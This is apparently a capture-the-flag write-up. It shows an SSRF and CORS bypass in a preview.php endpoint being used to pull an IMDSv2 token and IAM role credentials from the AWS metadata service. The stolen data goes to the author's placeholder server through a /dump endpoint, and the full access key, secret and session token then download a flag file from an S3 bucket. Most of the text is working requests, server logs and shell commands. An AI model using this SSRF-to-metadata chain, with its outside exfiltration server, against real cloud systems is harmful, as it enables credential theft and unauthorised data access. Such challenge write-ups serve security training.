# Hacker Toolz

Using SSRF and CORS bypass we can read responses from instance data. As IMDSv2 is used we first need to send PUT request to get the token and then use that token in the next requests.

So I created a web server to serve pages with js and to dump received data (server.py).

#### Getting token
```
GET /preview.php?url=http://MY_SEVER_ADDRESS:8000/dojs?type=5%26path=http://169.254.169.254/latest/api/token HTTP/1.1
Host: 52.14.108.42
```
```
52.14.108.42 - - [22/Feb/2021 11:02:05] "GET /dojs?type=5&path=http://169.254.169.254/latest/api/token HTTP/1.1" 200 -
AQAEAHGwT3PXn95KUVvwruQseDKLZpQcAAGsVgFcbD93y1fVeRn7rA==200
52.14.108.42 - - [22/Feb/2021 11:02:05] "GET /dump?data=AQAEAHGwT3PXn95KUVvwruQseDKLZpQcAAGsVgFcbD93y1fVeRn7rA%3D%3D200 HTTP/1.1" 200 -
```

#### Getting creds
```
GET /preview.php?url=http://MY_SEVER_ADDRESS:8000/dojs?type=6%26path=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role HTTP/1.1
Host: 52.14.108.42
```
```
52.14.108.42 - - [22/Feb/2021 11:07:05] "GET /dojs?type=6&path=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role HTTP/1.1" 200 -
{
  "Code" : "Success",
  "LastUpdated" : "2021-02-22T10:55:53Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA5HRVYIWQPGPEB7FM",
  "SecretAccessKey" : "/FynOqpbbCBb/wzDTqYjj4IJX6PrCao63/tttk0/",
  "Token" : "IQoJb3JpZ2luX2VjEMv//////////wEaCXVzLWVhc3QtMiJGMEQCIHMGqVJyxzRmP11P39JCaqIvKOtclVDtjsAVK8X/ARjOAiAPbwWnuI1EWni4/wS5my7yu2t8+ASj4nGBIxEqVRPX4Sq9AwjU//////////8BEAAaDDkwOTU3MjA2NDY3MiIM5tHvnNBeiYwO2t6nKpEDByH5GAG9SrGSrzul01i8TaPWt/SKWrOcPrGmUQTKNfhTbge2XVTkB39CEFBGO6NontTtv6dxJHsVcov8Mr3DAS3L4gzyNwom1nM8St3bXxgfw0TSFCsGK5/iAxIUo4giZ0J6jBwKmwB8JP+zO18AhOC8z1dG1ieLjIstBnYYAN4gqFx7xEAuZrQBT/BZrRuJEvbRDIUK7pX7iQ3uV0aF32DSKzeMpmwIYHY4hB98dSjojZF0f1EYgYU8vNom40XCfQzfj9XeGJkEfuTe+d7jsSVFqke0kp4CbPoGPMUSacz4VuEGSnsGSsgzfJJyexuphgw/CSNfrdYbpFWEAcqCFYvBsCFMFbEN0OcB5Z2HYF5pTuqBJPhj/DSbzqz6KgoEO1vD68vl2D+CT6IHyfsU9GmNw9X1fm2Y8ETVRnWusnVXPTtPl7Bu4oc2TqcPCGvgeGXlQ7Up06yhko9NAJX+cD7PfPAh6FktQYSvOxp3L8HXK06lkSveATUXsX8o6nSYOagd4rRb7Sq8XZVaVL2RDz8wiZvOgQY67AErfrDT/406Sv3d/le/V6LBPVhBDXqi37BdY6yR+uw/7vH9+R8wKJmS4CEh6m0uztWcyhZHHHL8LoFqbZjrie0WDJuEfpv6X4s26KjsZCxqBbnW8dsrk0UB4VWMrDg8s0Sx/2NMOeimsM1MvtotByuuNuArGHJ/S1FCf1JTZwTB+q7fOIbsE7xY2BgpM1v+QHj1RYSYbjtngJuZpCL5cnRc8fYXi1VAoQUUUlTYOtC+sryL1Uyfhcp7OEbB97cnDTy4pnKUUDvj1nfxmgnygXufNz5/Ho/M4rS9xj7dHOmIoh8R0rEoo8OoFc31Gw==",
  "Expiration" : "2021-02-22T17:01:24Z"
}200
52.14.108.42 - - [22/Feb/2021 11:07:05] "GET /dump?data=%7B%0A%20%20%22Code%22%20%3A%20%22Success%22%2C%0A%20%20%22LastUpdated%22%20%3A%20%222021-02-22T10%3A55%3A53Z%22%2C%0A%20%20%22Type%22%20%3A%20%22AWS-HMAC%22%2C%0A%20%20%22AccessKeyId%22%20%3A%20%22ASIA5HRVYIWQPGPEB7FM%22%2C%0A%20%20%22SecretAccessKey%22%20%3A%20%22%2FFynOqpbbCBb%2FwzDTqYjj4IJX6PrCao63%2Ftttk0%2F%22%2C%0A%20%20%22Token%22%20%3A%20%22IQoJb3JpZ2luX2VjEMv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMiJGMEQCIHMGqVJyxzRmP11P39JCaqIvKOtclVDtjsAVK8X%2FARjOAiAPbwWnuI1EWni4%2FwS5my7yu2t8%2BASj4nGBIxEqVRPX4Sq9AwjU%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDkwOTU3MjA2NDY3MiIM5tHvnNBeiYwO2t6nKpEDByH5GAG9SrGSrzul01i8TaPWt%2FSKWrOcPrGmUQTKNfhTbge2XVTkB39CEFBGO6NontTtv6dxJHsVcov8Mr3DAS3L4gzyNwom1nM8St3bXxgfw0TSFCsGK5%2FiAxIUo4giZ0J6jBwKmwB8JP%2BzO18AhOC8z1dG1ieLjIstBnYYAN4gqFx7xEAuZrQBT%2FBZrRuJEvbRDIUK7pX7iQ3uV0aF32DSKzeMpmwIYHY4hB98dSjojZF0f1EYgYU8vNom40XCfQzfj9XeGJkEfuTe%2Bd7jsSVFqke0kp4CbPoGPMUSacz4VuEGSnsGSsgzfJJyexuphgw%2FCSNfrdYbpFWEAcqCFYvBsCFMFbEN0OcB5Z2HYF5pTuqBJPhj%2FDSbzqz6KgoEO1vD68vl2D%2BCT6IHyfsU9GmNw9X1fm2Y8ETVRnWusnVXPTtPl7Bu4oc2TqcPCGvgeGXlQ7Up06yhko9NAJX%2BcD7PfPAh6FktQYSvOxp3L8HXK06lkSveATUXsX8o6nSYOagd4rRb7Sq8XZVaVL2RDz8wiZvOgQY67AErfrDT%2F406Sv3d%2Fle%2FV6LBPVhBDXqi37BdY6yR%2Buw%2F7vH9%2BR8wKJmS4CEh6m0uztWcyhZHHHL8LoFqbZjrie0WDJuEfpv6X4s26KjsZCxqBbnW8dsrk0UB4VWMrDg8s0Sx%2F2NMOeimsM1MvtotByuuNuArGHJ%2FS1FCf1JTZwTB%2Bq7fOIbsE7xY2BgpM1v%2BQHj1RYSYbjtngJuZpCL5cnRc8fYXi1VAoQUUUlTYOtC%2BsryL1Uyfhcp7OEbB97cnDTy4pnKUUDvj1nfxmgnygXufNz5%2FHo%2FM4rS9xj7dHOmIoh8R0rEoo8OoFc31Gw%3D%3D%22%2C%0A%20%20%22Expiration%22%20%3A%20%222021-02-22T17%3A01%3A24Z%22%0A%7D200 HTTP/1.1" 200 -
```

#### Using creds and getting flag
```
~# export AWS_ACCESS_KEY_ID=ASIA5HRVYIWQPGPEB7FM
~# export AWS_SECRET_ACCESS_KEY="/FynOqpbbCBb/wzDTqYjj4IJX6PrCao63/tttk0/"
~# export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEMv//////////wEaCXVzLWVhc3QtMiJGMEQCIHMGqVJyxzRmP11P39JCaqIvKOtclVDtjsAVK8X/ARjOAiAPbwWnuI1EWni4/wS5my7yu2t8+ASj4nGBIxEqVRPX4Sq9AwjU//////////8BEAAaDDkwOTU3MjA2NDY3MiIM5tHvnNBeiYwO2t6nKpEDByH5GAG9SrGSrzul01i8TaPWt/SKWrOcPrGmUQTKNfhTbge2XVTkB39CEFBGO6NontTtv6dxJHsVcov8Mr3DAS3L4gzyNwom1nM8St3bXxgfw0TSFCsGK5/iAxIUo4giZ0J6jBwKmwB8JP+zO18AhOC8z1dG1ieLjIstBnYYAN4gqFx7xEAuZrQBT/BZrRuJEvbRDIUK7pX7iQ3uV0aF32DSKzeMpmwIYHY4hB98dSjojZF0f1EYgYU8vNom40XCfQzfj9XeGJkEfuTe+d7jsSVFqke0kp4CbPoGPMUSacz4VuEGSnsGSsgzfJJyexuphgw/CSNfrdYbpFWEAcqCFYvBsCFMFbEN0OcB5Z2HYF5pTuqBJPhj/DSbzqz6KgoEO1vD68vl2D+CT6IHyfsU9GmNw9X1fm2Y8ETVRnWusnVXPTtPl7Bu4oc2TqcPCGvgeGXlQ7Up06yhko9NAJX+cD7PfPAh6FktQYSvOxp3L8HXK06lkSveATUXsX8o6nSYOagd4rRb7Sq8XZVaVL2RDz8wiZvOgQY67AErfrDT/406Sv3d/le/V6LBPVhBDXqi37BdY6yR+uw/7vH9+R8wKJmS4CEh6m0uztWcyhZHHHL8LoFqbZjrie0WDJuEfpv6X4s26KjsZCxqBbnW8dsrk0UB4VWMrDg8s0Sx/2NMOeimsM1MvtotByuuNuArGHJ/S1FCf1JTZwTB+q7fOIbsE7xY2BgpM1v+QHj1RYSYbjtngJuZpCL5cnRc8fYXi1VAoQUUUlTYOtC+sryL1Uyfhcp7OEbB97cnDTy4pnKUUDvj1nfxmgnygXufNz5/Ho/M4rS9xj7dHOmIoh8R0rEoo8OoFc31Gw=="
~# aws s3 ls
2021-01-12 16:37:04 secretdocs
~# aws s3 ls secretdocs
2021-01-12 18:22:24        241 leviathan.txt
~# aws s3 cp s3://secretdocs/leviathan.txt flag
download: s3://secretdocs/leviathan.txt to ./flag       
```
